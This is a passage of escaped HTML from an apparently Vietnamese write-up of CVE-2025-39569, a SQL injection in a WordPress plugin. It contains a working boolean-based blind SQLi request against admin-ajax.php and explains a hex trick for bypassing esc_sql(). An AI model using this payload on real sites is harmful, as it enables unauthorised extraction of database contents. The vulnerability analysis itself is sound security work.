.is-closed]:!tw-max-h-0 \n      group-[.is-wrap]:tw-text-wrap\n      tw-overflow-y-hidden\n      tw-overflow-x-auto\n      tw-scrollbar-thin\n      \"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/wp-admin/admin-ajax.php\u003c/span\u003e \u003cspan class=\"kr\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"g\"\u003eaction=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/div\u003e\n\u003cblockquote\u003e\n  \u003cp\u003eDatabase name được tôi đặt tên là \u003cstrong\u003ewordpress\u003c/strong\u003e nên kí tự đầu tiên là \u003ccode\u003ew\u003c/code\u003e tương ứng với mã HEX là \u003ccode\u003e0x77\u003c/code\u003e\u003c/p\u003e\n\n\u003c/blockquote\u003e\u003cp\u003eSử dụng \u003ccode\u003eSUBSTRING(STRING,1,1)\u003c/code\u003e để lấy kí tự đầu tiên của chuỗi\u003c/p\u003e\n\u003cp\u003eỞ đây, \u003ccode\u003e$proj_id\u003c/code\u003e bằng \u003ccode\u003e4\u003c/code\u003e vì \u003ccode\u003eSUBSTRING('wordpress',1,1)=0x77\u003c/code\u003e là đúng nên \u003ccode\u003eSELECT\u003c/code\u003e lấy giá trị đúng trong \u003ccode\u003eIF(condition, value if true, value if false)\u003c/code\u003e, \u003ccode\u003e4\u003c/code\u003e là giá trị có thực trong database, nên response trả về chứa danh sách người tham gia dự án\u003c/p\u003e\n\u003cfigure\u003e\u003cimg src=\"/2025-09-22-cve-2025-39569/res.png\"\n    alt=\"response 1\"\u003e\u003cfigcaption\u003e\n      \u003cp\u003eRes 1\u003c/p\u003e\n    \u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cp\u003eSử dụng \u003cstrong\u003eHEX technique\u003c/strong\u003e để bypass hàm \u003ccode\u003eesc_sql()\u003c/code\u003e \u003ca href=\"#patch-diff\" rel=\"\"\u003eở trên\u003c/a\u003e, dùng để so sánh khi không sử dùng được \u003ccode\u003e'\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eGửi request với SQLi payload \u003cstrong\u003eboolean base\u003c/strong\u003e vói \u003ccode\u003eproj_id\u003c/code\u003e sai:\u003c/p\u003e\n\u003cdiv class=\"code-block highlight is-open show-line-numbers  tw-group tw-my-2\"\u003e\n  \u003cdiv class=\"\n    \n    tw-flex \n    tw-flex-row\n    tw-flex-1 \n    tw-justify-between \n    tw-w-full tw-bg-bgColor-secondary\n    \"\u003e      \n    \u003cbutton \n      class=\"\n        code-block-button\n        tw-mx-2 \n        tw-flex\n        tw-flex-row\n        tw-flex-1\"\n      aria-hidden=\"true\"\u003e\n          \u003cdiv class=\"group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 320 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z\"/\u003e\u003c/svg\u003e\u003c/div\u003e\n          \u003cp class=\"tw-select-none !tw-my-1\"\u003ehttp\u003c/p\u003e\n      \u003c/button\u003e\n\n   \u003cdiv class=\"tw-flex\"\u003e\n      \u003cbutton \n        class=\"\n          line-number-button\n          tw-mx-2 \n          tw-hidden \n          group-[.is-open]:tw-block \n          group-[.